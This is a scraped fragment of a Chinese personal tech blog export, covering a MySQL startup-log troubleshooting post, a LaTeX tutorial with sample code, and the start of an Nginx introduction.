'INNODB_CMPMEM_RESET'2021-09-07T14:39:03.314950Z 0 [Note] Shutting down plugin 'INNODB_CMPMEM'2021-09-07T14:39:03.314952Z 0 [Note] Shutting down plugin 'INNODB_CMP_RESET'2021-09-07T14:39:03.314954Z 0 [Note] Shutting down plugin 'INNODB_CMP'2021-09-07T14:39:03.314955Z 0 [Note] Shutting down plugin 'INNODB_LOCK_WAITS'2021-09-07T14:39:03.314957Z 0 [Note] Shutting down plugin 'INNODB_LOCKS'2021-09-07T14:39:03.314959Z 0 [Note] Shutting down plugin 'INNODB_TRX'2021-09-07T14:39:03.314960Z 0 [Note] Shutting down plugin 'InnoDB'2021-09-07T14:39:03.315224Z 0 [Note] InnoDB: FTS optimize thread exiting.2021-09-07T14:39:03.315594Z 0 [Note] InnoDB: Starting shutdown...2021-09-07T14:39:03.418386Z 0 [Note] InnoDB: Dumping buffer pool(s) to /data/mysql/data/ib_buffer_pool2021-09-07T14:39:03.420270Z 0 [Note] InnoDB: Buffer pool(s) dump completed at 210907 22:39:032021-09-07T14:39:04.743034Z 0 [Note] InnoDB: Shutdown completed; log sequence number 25250132021-09-07T14:39:04.744169Z 0 [Note] InnoDB: Removed temporary tablespace data file: &quot;ibtmp1&quot;2021-09-07T14:39:04.744181Z 0 [Note] Shutting down plugin 'MEMORY'2021-09-07T14:39:04.744185Z 0 [Note] Shutting down plugin 'PERFORMANCE_SCHEMA'2021-09-07T14:39:04.744209Z 0 [Note] Shutting down plugin 'MRG_MYISAM'2021-09-07T14:39:04.744213Z 0 [Note] Shutting down plugin 'MyISAM'2021-09-07T14:39:04.744226Z 0 [Note] Shutting down plugin 'CSV'2021-09-07T14:39:04.744243Z 0 [Note] Shutting down plugin 'sha256_password'2021-09-07T14:39:04.744251Z 0 [Note] Shutting down plugin 'mysql_native_password'2021-09-07T14:39:04.744334Z 0 [Note] Shutting down plugin 'binlog'2021-09-07T14:39:04.744501Z 0 [Note] /application/mysql/bin/mysqld: Shutdown complete2021-09-07T15:02:06.766275Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).2021-09-07T15:02:06.766353Z 0 [Note] --secure-file-priv is set to NULL. Operations related to importing and exporting data are disabled2021-09-07T15:02:06.766374Z 0 [Note] /application/mysql/bin/mysqld (mysqld 5.7.26) starting as process 11739 ...2021-09-07T15:02:06.769611Z 0 [Note] InnoDB: PUNCH HOLE support available2021-09-07T15:02:06.769627Z 0 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins2021-09-07T15:02:06.769630Z 0 [Note] InnoDB: Uses event mutexes2021-09-07T15:02:06.769633Z 0 [Note] InnoDB: GCC builtin __sync_synchronize() is used for memory barrier2021-09-07T15:02:06.769640Z 0 [Note] InnoDB: Compressed tables use zlib 1.2.112021-09-07T15:02:06.769643Z 0 [Note] InnoDB: Using Linux native AIO2021-09-07T15:02:06.769782Z 0 [Note] InnoDB: Number of pools: 12021-09-07T15:02:06.769838Z 0 [Note] InnoDB: Using CPU crc32 instructions2021-09-07T15:02:06.771164Z 0 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M2021-09-07T15:02:06.775414Z 0 [Note] InnoDB: Completed initialization of buffer pool2021-09-07T15:02:06.776612Z 0 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().2021-09-07T15:02:06.797109Z 0 [Note] InnoDB: Highest supported file format is Barracuda.2021-09-07T15:02:06.822427Z 0 [Note] InnoDB: Creating shared tablespace for temporary tables2021-09-07T15:02:06.822510Z 0 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...2021-09-07T15:02:06.834664Z 0 [Note] InnoDB: File './ibtmp1' size is now 12 MB.2021-09-07T15:02:06.835476Z 0 [Note] InnoDB: 96 redo rollback segment(s) found. 96 redo rollback segment(s) are active.2021-09-07T15:02:06.835485Z 0 [Note] InnoDB: 32 non-redo rollback segment(s) are active.2021-09-07T15:02:06.836314Z 0 [Note] InnoDB: Waiting for purge to start2021-09-07T15:02:06.887927Z 0 [Note] InnoDB: 5.7.26 started; log sequence number 25250132021-09-07T15:02:06.888103Z 0 [Note] InnoDB: Loading buffer pool(s) from /data/mysql/data/ib_buffer_pool2021-09-07T15:02:06.888150Z 0 [Note] Plugin 'FEDERATED' is disabled.2021-09-07T15:02:06.889076Z 0 [Note] InnoDB: Buffer pool(s) load completed at 210907 23:02:062021-09-07T15:02:06.890843Z 0 [Warning] Failed to set up SSL because of the following SSL library error: SSL context is not usable without certificate and private key2021-09-07T15:02:06.890854Z 0 [Note] Server hostname (bind-address): '*'; port: 33062021-09-07T15:02:06.891517Z 0 [Note] IPv6 is available.2021-09-07T15:02:06.891526Z 0 [Note] - '::' resolves to '::';2021-09-07T15:02:06.891542Z 0 [Note] Server socket created on IP: '::'.2021-09-07T15:02:06.894311Z 0 [Note] Failed to start slave threads for channel ''2021-09-07T15:02:06.897020Z 0 [Note] Event Scheduler: Loaded 0 events2021-09-07T15:02:06.897254Z 0 [Note] /application/mysql/bin/mysqld: ready for connections.Version: '5.7.26' socket: '/tmp/mysql.sock' port: 3306 MySQL Community Server (GPL)2021-09-07T15:06:45.672139Z 0 [Note] Giving 0 client threads a chance to die gracefully2021-09-07T15:06:45.672182Z 0 [Note] Shutting down slave threads2021-09-07T15:06:45.672188Z 0 [Note] Forcefully disconnecting 0 remaining clients2021-09-07T15:06:45.672193Z 0 [Note] Event Scheduler: Purging the queue. 0 events2021-09-07T15:06:45.672414Z 0 [Note] Binlog end2021-09-07T15:06:45.672929Z 0 [Note] Shutting down plugin 'ngram'2021-09-07T15:06:45.672938Z 0 [Note] Shutting down plugin 'BLACKHOLE'2021-09-07T15:06:45.672941Z 0 [Note] Shutting down plugin 'ARCHIVE'2021-09-07T15:06:45.672943Z 0 [Note] Shutting down plugin 'partition'2021-09-07T15:06:45.672944Z 0 [Note] Shutting down plugin 'INNODB_SYS_VIRTUAL'2021-09-07T15:06:45.672947Z 0 [Note] Shutting down plugin 'INNODB_SYS_DATAFILES'2021-09-07T15:06:45.672948Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLESPACES'2021-09-07T15:06:45.672950Z 0 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN_COLS'2021-09-07T15:06:45.672952Z 0 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN'2021-09-07T15:06:45.672953Z 0 [Note] Shutting down plugin 'INNODB_SYS_FIELDS'2021-09-07T15:06:45.672955Z 0 [Note] Shutting down plugin 'INNODB_SYS_COLUMNS'2021-09-07T15:06:45.672956Z 0 [Note] Shutting down plugin 'INNODB_SYS_INDEXES'2021-09-07T15:06:45.672958Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLESTATS'2021-09-07T15:06:45.672959Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLES'2021-09-07T15:06:45.672961Z 0 [Note] Shutting down plugin 'INNODB_FT_INDEX_TABLE'2021-09-07T15:06:45.672962Z 0 [Note] Shutting down plugin 'INNODB_FT_INDEX_CACHE'2021-09-07T15:06:45.672970Z 0 [Note] Shutting down plugin 'INNODB_FT_CONFIG'2021-09-07T15:06:45.672972Z 0 [Note] Shutting down plugin 'INNODB_FT_BEING_DELETED'2021-09-07T15:06:45.672973Z 0 [Note] Shutting down plugin 'INNODB_FT_DELETED'2021-09-07T15:06:45.672975Z 0 [Note] Shutting down plugin 'INNODB_FT_DEFAULT_STOPWORD'2021-09-07T15:06:45.672977Z 0 [Note] Shutting down plugin 'INNODB_METRICS'2021-09-07T15:06:45.672978Z 0 [Note] Shutting down plugin 'INNODB_TEMP_TABLE_INFO'2021-09-07T15:06:45.672980Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_POOL_STATS'2021-09-07T15:06:45.672981Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE_LRU'2021-09-07T15:06:45.672983Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE'2021-09-07T15:06:45.672984Z 0 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX_RESET'2021-09-07T15:06:45.672986Z 0 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX'2021-09-07T15:06:45.672987Z 0 [Note] Shutting down plugin 'INNODB_CMPMEM_RESET'2021-09-07T15:06:45.672989Z 0 [Note] Shutting down plugin 'INNODB_CMPMEM'2021-09-07T15:06:45.672990Z 0 [Note] Shutting down plugin 'INNODB_CMP_RESET'2021-09-07T15:06:45.672992Z 0 [Note] Shutting down plugin 'INNODB_CMP'2021-09-07T15:06:45.672994Z 0 [Note] Shutting down plugin 'INNODB_LOCK_WAITS'2021-09-07T15:06:45.672995Z 0 [Note] Shutting down plugin 'INNODB_LOCKS'2021-09-07T15:06:45.672997Z 0 [Note] Shutting down plugin 'INNODB_TRX'2021-09-07T15:06:45.672999Z 0 [Note] Shutting down plugin 'InnoDB'2021-09-07T15:06:45.673079Z 0 [Note] InnoDB: FTS optimize thread exiting.2021-09-07T15:06:45.673309Z 0 [Note] InnoDB: Starting shutdown...2021-09-07T15:06:45.781638Z 0 [Note] InnoDB: Dumping buffer pool(s) to /data/mysql/data/ib_buffer_pool2021-09-07T15:06:45.782941Z 0 [Note] InnoDB: Buffer pool(s) dump completed at 210907 23:06:452021-09-07T15:06:47.054650Z 0 [Note] InnoDB: Shutdown completed; log sequence number 25250412021-09-07T15:06:47.055692Z 0 [Note] InnoDB: Removed temporary tablespace data file: &quot;ibtmp1&quot;2021-09-07T15:06:47.055700Z 0 [Note] Shutting down plugin 'MEMORY'2021-09-07T15:06:47.055705Z 0 [Note] Shutting down plugin 'PERFORMANCE_SCHEMA'2021-09-07T15:06:47.055721Z 0 [Note] Shutting down plugin 'MRG_MYISAM'2021-09-07T15:06:47.055723Z 0 [Note] Shutting down plugin 'MyISAM'2021-09-07T15:06:47.055731Z 0 [Note] Shutting down plugin 'CSV'2021-09-07T15:06:47.055735Z 0 [Note] Shutting down plugin 'sha256_password'2021-09-07T15:06:47.055737Z 0 [Note] Shutting down plugin 'mysql_native_password'2021-09-07T15:06:47.055817Z 0 [Note] Shutting down plugin 'binlog'2021-09-07T15:06:47.056100Z 0 [Note] /application/mysql/bin/mysqld: Shutdown complete 未找到报错信息 使用基于centos6的服务启动方法 1~]# service mysqld start Starting MySQL.. SUCCESS! 启用成功 或者使用 1/etc/init.d/mysqld restart 12345678910111213141516171819202122232425[root@server1 ~]# mysqlWelcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 2Server version: 5.7.26 MySQL Community Server (GPL)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.10 sec)mysql&gt;","link":"/2021/09/07/Centos7%E4%B8%AD%E7%9A%84%E5%90%AF%E5%8A%A8MySQL%E5%87%BA%E7%8E%B0%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"title":"LaTeX编程","text":"LaTeX环境的安装与配置https://mirrors.tuna.tsinghua.edu.cn/ctan/systems/texlive/Images/ http://texstudio.sourceforge.net/ tex live为例 LaTeX更新：tlmgr update --all 创建目录，保存文件 \\documentclass{article} 引入一个文档类，撰写论文相关操作 \\begin{document} ……（撰写文档） \\end{document} 命令行中的操作：latex test.tex dvipdfmx test.dvi del *.aux *.dvi *.log 可以做成批处理文件 xelatex直接将LaTeX文件编译为PDF文件 支持中文的编码为utf-8 ，并且引入宏包\\usepackage{ctex} 选项——构建——XeLaTeX，方便支持中文 LaTeX源文件的基本结构123456789101112131415161718% 导言区,全局设置% 一个LaTeX文件有且只有一个document环境\\documentclass{article} % book, report, letter 改变排版结构\\title{My First Document}\\author{xiao kai}\\date{\\today}% 正文区（文稿区）\\begin{document} % *环境名称*为document \\maketitle % 输出标题 Hello World！ % here is my big formula % 空行为换行 Let$f(x)$be define by the formula $f(x)=3x^2+x-1$ % 单$表示行内公式 $$f(x)=3x^2+x-1$$你好啊 % 双$表示行间公式\\end{document} LaTeX中的中文处理方式TeXstdio —&gt; 选项 —&gt; 设置 —&gt; 构建 —&gt; XeLaTeX ​ —&gt; 编辑器 —&gt; UTF-8 123456789101112131415161718192021% 导言区\\documentclass{article} % book, report, letter 改变排版结构\\usepackage{ctex}\\title{\\heiti 哦哦}\\newcommand\\degree{^\\circ} % 定义新命令\\author{\\kaishu 小凯}\\date{\\today}%正文区 \\begin{document} % *环境名称*为document \\maketitle % 输出标题 Hello World！ % here is my big formula \\begin{equation} AB^2 = BC^2 + AC^2. \\end{equation} % 输出带有编号的行间公式 \\end{document} cmd：texdoc ctex ctex宏集提供：ctexart、ctexrep、ctexbook文档类 ctexbook, ctexreport 12\\documentclass{cteart} % book, report, letter 改变排版结构% \\usepackage{ctex} cmd：texdoc lshort-zh LaTeX学习文档 LaTeX的字体字号设置在LaTeX中，一个字体有5种属性 字体编码 正文字体编码：OT1、T1、EU1等 数字字体编码：OML、OMS、OMX等 字体族 罗马字体：笔画起始处有装饰 无衬线字体：笔画起始处无装饰 打字机字体：每个字符宽度相同，又称等宽字体 字体系列 粗细 宽度 字体形状 直立 斜体 伪斜体 小型大写 字体大小 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152% 导言区\\documentclass{article} % \\documentclass[10, 11, 12]{article}\\usepackage{ctex}\\newcommand{\\myfont}{\\textbf{\\textsf{Fancy Text}}}% 正文区（文稿区）\\begin{document} % 字体族设置（罗马字体、无衬线字体、打字机字体） \\textrm{Roman Family} % \\textsf{Sans Serif Family} \\texttt{Typewriter Family} \\rmfamily Roman Family % 字体声明 {\\sffamily Sans Serif Family}{\\ttfamily Typewriter Family} % 使用大括号进行分组，声明字体分组的作用范围 % 字体系列设置（粗细、宽度） \\textmd{Medium Series} \\textbf{Boldface Series} {\\mdseries Medium Series} {\\bfseries Boldface Series} % 字体形状（直立、斜体、伪斜体、小型大写） \\textup{Upright Shape} \\textit{Italic Shape} \\textsl{Slanted Shape} \\textsc{Small Caps Shape} {\\upshape Upright Shape} {\\itshape Italic Shape} {\\slshape Slanted Shape} {\\scshape Small Caps Shape} % 中文字体 {\\songti 宋体} \\quad {\\heiti 黑体} \\quad {\\fangsong 仿宋} \\quad {\\kaishu 楷书} 中文字体的\\textbf{粗体}与\\textit{斜体} % 黑体与楷体 %字体大小 {\\tiny HEllo}\\\\ {\\scriptsize HEllo}\\\\ {\\footnotesize HEllo}\\\\ {\\small HEllo}\\\\ {\\normalsize HEllo}\\\\ {\\large HEllo}\\\\ {\\Large HEllo}\\\\ {\\LARGE HEllo}\\\\ {\\huge HEllo}\\\\ {\\Huge HEllo}\\\\ % 中文字号设置命令 \\zihao{-0} 你好！ % -0表示小初号 \\myfont % 执行newcommand定义的新命令 \\end{document} LaTeX文档的基本结构12345678910111213141516171819202122232425% 导言区\\documentclass{article} %ctexbook, ctexrep% 使用ctexart时标题居中排版\\usepackage{ctex}% 正文区（文稿区）\\begin(document) \\tableofcontents % 产生文档的目录 \\chapter{绪论} % 产生带章节的大纲 ctexbook \\section{引言} % 创建小节 之后对耳环无符号\\par IU会很热v % \\par产生新的段落 \\section{实验方法} \\section{实验结果} \\subsection{数据} % 创建子小节 \\subsection{图表} \\subsubsection{实验条件} % 创建子小节的子小节 \\subsubsection{实验过程} \\subsection{结果分析} \\section{结论} \\section{致谢} \\end{document} \\\\反斜杠实现换行 空行实现新的段落 \\par产生新的段落 LaTeX中的特殊字符1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283% 导言区\\documentclass{article} %ctexbook, ctexrep% 使用ctexart时标题居中排版\\usepackage{ctex}% 正文区（文稿区）\\begin(document) \\section{空白符号} % 创建小节 % 空白分行，多个空行等同于1个 % 自动缩进，绝对不能使用空格代替 % 英文中多个空格自动处理为1个空格，中文中空格将被忽略 % 汉字与其它字符的间距会自动由XeLaTeX处理 % 禁止使用中文全角空格 % 1em（当前字体中M的宽度） a\\quad b % 2em a\\qquad b % 约为1/6个em a\\,b a\\thinspace b % 0.5个em a\\enspace b % 空格 a\\ b % 硬空格 a~b % 1pc=12pt=4.218mm a\\kern 1pc b % 产生指定宽度空白 a\\kern -1em b a\\hskip 1em b a\\hspace{35pt}b % 占位宽度 a\\hphantom{xyz}b % 参数的宽度 % 弹性长度 a\\hfill b \\section{\\LaTeX 控制符} \\# \\$ \\% \\{ \\} \\~{} \\_{} \\^{} \\textbackslash % \\ \\&amp; \\section{排版符号} \\S \\P \\dag \\ddag \\copyright \\pounds % §¶†‡©£ \\section{\\Tex 标志符号} % 基本符号 \\TeX{} \\LaTeX{} \\LaTeXe % TEX LATEX LATEX 2 \\XeLaTeX % usepackage{xltxtra} 针对XeTeX的改进并且加入了XeTeX的LOGO \\section{引号} ` ' `` '' % ‘ ’ “ ” \\section{连字符} - -- --- % - – — \\section{非英文字符} \\oe \\OE \\ae \\AE \\aa \\AA \\o \\O \\1 \\L \\ss \\SS !` ?` % œŒæÆåÅøØłŁß \\section{重音符号（以o为例} \\`o \\'o \\^o \\''o \\~o \\=o \\.o \\u{o} \\v{o} \\H{o} \\r{o} \\t{o} \\b{o} \\c{o} \\d{o} % ò ó ô ’́o õ ō ȯ ŏ ǒ ő o̊ o o̲ o \\end{document} LaTeX中的插图123456789101112131415161718192021222324% 导言区： \\usepackage{graphicx}% 语 法： \\includegraphics[&lt;选项&gt;]{&lt;文件名&gt;}% 格 式： EPS, PDF, PNG, JPEG, BMP\\usepackage{graphicx}\\graphicspath{{figures/}, {pics/}} % 图片在当前目录下的figures目录% 正文区\\begin{document} \\LaTeX{}中的插图 \\includegraphics{lion} % 后缀名可加可不加 \\includegraphics[scale=0.3]{lion} % 指定缩放因子 \\includegraphics[height=2cm]{lion} % 固定值的图像高度 \\includegraphics[width=2cm]{lion} % 固定值的图像宽度 \\includegraphics[height=0.1\\textheight]{lion} % 版型文本0.1倍的图像高度 \\includegraphics[width=0.2\\textheight]{lion} % 版型文本0.2倍的图像宽度 \\includegraphics[angle=-45, width=0.2\\textheight]{lion} % 旋转角度，同时指定多个参数 \\end{document} LaTeX中的表格1234567891011121314151617181920212223242526% \\begin{tabular}[&lt;垂直对齐方式&gt;]{&lt;列格式说明&gt;}% &lt;表项&gt; &amp; &lt;表项&gt; &amp; … &amp; &lt;表项&gt; \\\\% ……% \\end{tabular}% 用\\\\表示换行% 用&amp;表示不同的列% l-本列左对齐% c-本列居中对齐% r-本列右对齐% p{&lt;宽&gt;}-本列宽度固定，能够自动换行% 正文区（文稿区）\\begin{document} \\begin{tabular}{l c c c r} % 必选参数，生成5列，分别为左中中中右对齐 % \\begin{tabular}{l|c|c|c|r} % 产生表格竖线 % \\begin{tabular}{|l||c||c|c|r|} % 双竖线与边界线 % \\begin{tabular}{l|c|c|c|p{1.5cm}|} % 指定表格宽度，超过后自动换行 姓名 &amp; 语文 &amp; 数学 &amp; 外语 &amp; 备注\\\\ % 不同列之间用&amp;分割 % \\\\结束表格的一行 张三 &amp; 87 &amp; 100 &amp; 93 &amp; 优秀 \\\\ \\hline % 产生表格横线 李四 &amp; 75 &amp; 64 &amp; 52 &amp; 补考另行通知\\\\ \\hline \\hline % 产生双横线 王二 &amp; 80 &amp; 82 &amp; 78 &amp; \\end{tabular}\\end{document} texdoc booktab : 三线表 texdoc longtab : 跨页长表格 texdoc tabu ：综合表格宏包 LaTeX中的浮动体123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657% 浮动体% 实现灵活分页（避免无法分割的内容产生的页面留白）% 给图标添加标题% 交叉引用% figure环境（table环境与之类似）% \\begin{figure}[&lt;允许位置&gt;]% &lt;任意内容&gt;% \\end{figure}% &lt;允许位置&gt;参数(默认tbp)% h，此处（here）-代码所在的上下文位置% t，页顶（top）-代码所在页面或之后页面的顶部% b，页底（bottom）-代码所在页面或之后页面的底部% p，独立一页（page）-浮动页面% 标题控制（caption、bicaption等宏包）% 并排与子图表（subcaption、subfig、floatrow等宏包）% 绕排（picinpar、wrapfig等宏包）\\usepackage{graphicx}\\graphicspath{{figures/}, {pics/}} % 图片在当前目录下的figures目录% 正文区\\begin{document} \\LaTeX{}中的插图 % \\LaTeX{}中的插图\\ref{fig} % 交叉引用 \\begin{figure} % \\begin{figure}[htbp] % 指定浮动体的排版位置 允许各个位置 \\centering % 环境中的内容居中排版 \\includegraphics[scale=0.3]{lion} % 指定缩放因子 \\caption{设置插图的标题} % 会自动进行编号 \\caption{设置插图的标题}\\label{fig} % 设置标签 \\end{figure} 在\\LaTeX{}中的表格： % 在\\LaTeX{}中的表格：\\ref{tab-score} \\begin{table} % \\begin{table}[h] % 排版位置参数 \\centering % 环境中的内容居中排版 \\caption{考试成绩单} % \\caption{考试成绩单}\\label{tab-score} \\begin{tabular}{l c c c r} % 必选参数，生成5列，分别为左中中中右对齐 \\hline 姓名 &amp; 语文 &amp; 数学 &amp; 外语 &amp; 备注\\\\ % 不同列之间用&amp;分割 % \\\\结束表格的一行 张三 &amp; 87 &amp; 100 &amp; 93 &amp; 优秀 \\\\ \\hline % 产生表格横线 李四 &amp; 75 &amp; 64 &amp; 52 &amp; 补考另行通知\\\\ \\hline \\hline % 产生双横线 王二 &amp; 80 &amp; 82 &amp; 78 &amp; \\\\ \\end{tabular} \\end{table}\\end{document} LaTeX数学公式初步1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374\\begin{document} 交换律是$a+b=b+a$,如\\(1+2=2+1=3\\) 交换律是\\begin{math}a+b=b+a\\end{math},如 \\begin{math}1+2=2+1=3\\end{math} $3x^2 - x + 2 = 0$ % 上标 $3x^{20} - x + 2 = 0$ % 上标 $3x^{3x^2 - x + 2 = 0} - x + 2 = 0$ % 上标 $a_0, a_1, a_2,..., a_{100}&amp; % 下标 % 希腊字母 $\\alpha$ $\\beta$ $\\gamma$ $\\epsilon$ $\\pi$ $\\omega$ $\\Gamma$ $\\Delta$ $\\Theta$ $\\Pi$ $\\Omega$ $\\alpha^3 + \\beta^2 + \\gamma = 0$ % 数学函数 $\\log$ $\\sin$ $\\cos$ $\\arcsin$ $\\arccos$ $\\ln$ $\\sin^2 x + \\cos^2 x = 1$ $y = \\arcsin x$ $\\sqrt[4]{x}$ % 分式 大约是体积的$3/4$ 大约是体积的$\\frac{3}{4}$ % 行间公式 $$ 1 + 1 = 2$$ \\[1 + 2 = 2 + 1 = 3\\] % displaymath环境 \\begin{displaymath} 1 + 2 = 2 + 1 = 3 \\end{displaymath} % 自动编号公式equation环境 \\begin{equation} \\end{equation} % 实现公式的交叉引用 交换律见式\\ref{eq:commutative} \\begin{equation} a + b = b + a \\label{eq:commutative} \\end{equation} % 不编号公式equation*环境 交换律见式\\ref{eq:commutative2} \\begin{equation*} a + b = b + a \\label{eq:commutative2} % 此时交叉引用编号为小节编号 \\end{equation*} % 不自动编号的须使用\\usepackage{amsmath} \\end{document}\\bar\\hat\\tilde 公式的编号与交叉引用是自动实现的，排版中，要习惯于采用自动化的方式处理诸如图、表、公式编号与交叉引用。 LaTeX数学模式的矩阵123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107\\usepackage{amsmath}% 正文区\\begin{document} % 矩阵环境，用&amp;分隔列，用\\\\分隔行 \\[ \\begin{matrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{matrix} % 矩阵两端添加小括号 \\begin{pmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{pmatrix} \\qquad % 添加中括号 \\begin{bmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix} \\qquad % 添加大括号 \\begin{Bmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{Bmatrix} \\qquad % 添加单竖线 \\begin{vmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{vmatrix} \\qquad % 添加双竖线 \\begin{Vmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{Vmatrix} \\qquad \\] % 可以使用上下标 \\[ A = \\begin{pmatrix} a_{11}^2 &amp; a_{12}^2 &amp; a_{13}^2 \\\\ 0 &amp; a_{22} &amp; a_{23} \\\\ 0 &amp; 0 &amp; a_{33} \\end{pmatrix} \\] % 常用省略号：\\dots \\vdots \\ddots \\[ A = \\begin{bmatrix} a_{11} &amp; \\dots &amp; a_{1n} \\\\ &amp; \\ddots &amp; \\vdots \\\\ 0 &amp; &amp; a_{nn} \\end{bmatrix}_{n \\times n} % \\times可以排版乘号 \\] % 分块矩阵（矩阵嵌套） \\[ \\begin{pmatrix} \\begin{matrix} 1&amp;0 \\\\ 0&amp;1 \\end{matrix} &amp; \\text{\\large 0}\\\\ % 需使用\\text临时转为文本模式 \\text{\\large 0} &amp; \\begin{matrix} 1&amp;0\\\\0&amp;-1 \\end{matrix} \\end{pmatrix} \\] % 三角矩阵 \\[ \\begin{pmatrix} a_{11} &amp; a_{12} &amp; \\cdots &amp; a_{1n} \\\\ &amp; a_{22} &amp; \\cdots &amp; a_{2n} \\\\ &amp; &amp; \\ddots &amp; \\vdots \\\\ \\multicolumn{2}{c}{\\raisebox{1.3ex}[0 pt]{\\Huge 0}} &amp; &amp;a_{nn} \\end{pmatrix} \\] % \\multicolumn合并多列 \\raisebox限制高度 % 跨列的省略号：\\hdotsfor{&lt;列数&gt;} \\[ \\begin{pmatrix} 1 &amp; \\frac 12 &amp; \\dots &amp; \\frac 1n \\\\ \\hdotsfor{4} \\\\ m &amp; \\frac m2 &amp; \\dots &amp; \\frac mn \\end{pmatrix} \\] % 行内小矩阵（smallmatrix）环境 复数$z = (x,y)$也可用矩阵 \\begin{math} \\left( % 需要手动添加左括号 \\begin{smallmatrix} x &amp; -y \\\\ y &amp; x \\end{smallmatrix} \\right) % 需要手动添加右括号 \\end{math} % array环境（类似于表格环境tabular） \\[ \\begin{array}{r|r} \\frac 12 &amp; 0 \\\\ \\hline 0 &amp; -\\frac a{bc} \\end{array} \\]\\end{document} LaTeX中的多行数学公式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253\\usepackage{amsmath}\\usepackage{amssymb}% 正文区\\begin{document} % gather和gather*环境（可以使用\\\\换行） % 带编号 \\begin{gather} a + b = b + a \\\\ ab ba \\end{gather} \\begin{gather*} a + b = b + a \\\\ ab ba \\end{gather*} \\begin{gather} a + b = b + a \\notag \\\\ % \\notag阻止编号 ab ba \\notag \\\\ abc \\end{gather} % align 和align*环境（用&amp;进行对齐） \\begin{align} x &amp;= t + \\cos t + 1 \\\\ y &amp;= 2\\sin t \\end{align} \\begin{align*} x &amp;= t + \\cos t + 1 \\\\ y &amp;= 2\\sin t \\end{align*} % &amp;= 按等号对齐 % split 环境（对齐采用align环境的方式，编号在中间） \\begin{equation} \\begin{split} \\cos 2x &amp;= \\cos^2 x - \\sin^2 x \\\\ &amp;= 2\\cos^2 x - 1 \\end{split} \\end{equation} % cases环境 % 每行公式中使用&amp;分割为两个部分 % 通常表示值和后面的条件 \\begin{equation} D(x) = \\begin{cases} 1, &amp; \\text{如果 } x \\in \\mathbb{Q}; \\\\ 0, &amp; \\text{如果 } x \\in \\mathbb{R}\\setminus\\mathbb{q} \\end{cases} % \\in属于 \\mathbb花体字符\\usepackage{amssymb}支持 \\text临时换成文本模式，不加则数学公式无法显示中文 \\end{equation}\\end{document} LaTeX中的参考文献——BibTeX123456789101112\\begin{document} % 一次管理，一次使用 % 参考文献格式： % \\begin{thebibliography}{编号样本} % \\bibitem[记号]{引用标志}文献条目1 % \\bibitem[记号]{引用标志}文献条目2 % ...... % \\end(thebibliography) % 其中文献条目包括：作者，题目，出版社，年代，版本，页码等 % 引用时候要可以采用：\\cite{引用标志1，引用标志2，...} % 引用一篇文章\\cite{article1} 引用一本书\\cite{book1}等等 生成.aux的辅助文件 https://www.zotero.org/download/ 不同的数据库是不同的bio文件 \\nocite{*}显示未引用文件 LaTeX中的参考文献BibLaTeX 改变需要先清理上次编译的辅助文件 工具——&gt;清理辅助文件 c：中文 e：英文 n：作者姓名 t：文献标识 y：出版年份 ce：先中文再英文 ec：先英文再中文 编译两次 LaTeX中的自定义命令和环境123% \\newcommand -定义命令% 命令只能由字母组成，不能以\\end开头% \\newcommand&lt;命令&gt;[&lt;参数个数&gt;][&lt;首参数默认值&gt;]{&lt;具体定义&gt;} 定义参数","link":"/2021/08/14/LaTeX%E6%95%99%E7%A8%8B/"},{"title":"nginx","text":"Nginx介绍Nginx简介 Nginx是lgor Sysoev为俄罗斯访问量第二的rambler.ru站点设计开发的。从2004年发布至今，凭借 开源的力量， 已经接近成熟与完善。 Nginx功能丰富，可作为HTTP服务器，也可作为反向代理服务器，邮件服务器。支持FastCGI、 SSL、Virtual Host、URL Rewrite、Gzip等功能。并且支持很多第三方的模块扩展。 官方：http://www.nginx.org/ Nginx特点 支持高并发，消耗内存资源少 具有多种功能 网站web服务功能 网站负载均衡功能 正向代理反向代理 网站缓存功能 在多种系统平台都可以部署 nginx实现网络通讯时使用的是异步网络IO模型：epoll模型，参考博客：https://segmentfault.co m/a/1190000003063859#item-3-13 工作原理 Nginx由内核和一系列模块组成，内核提供web服务的基本功能,如启用网络协议,创建运行环境,接 收和分配客户端请求,处 理模块之间的交互。Nginx的各种功能和操作都由模块来实现。Nginx的模块从结构上分为核心模块、基础模块和第三方模块。 1）核心模块： HTTP模块、EVENT模块和MAIL模块 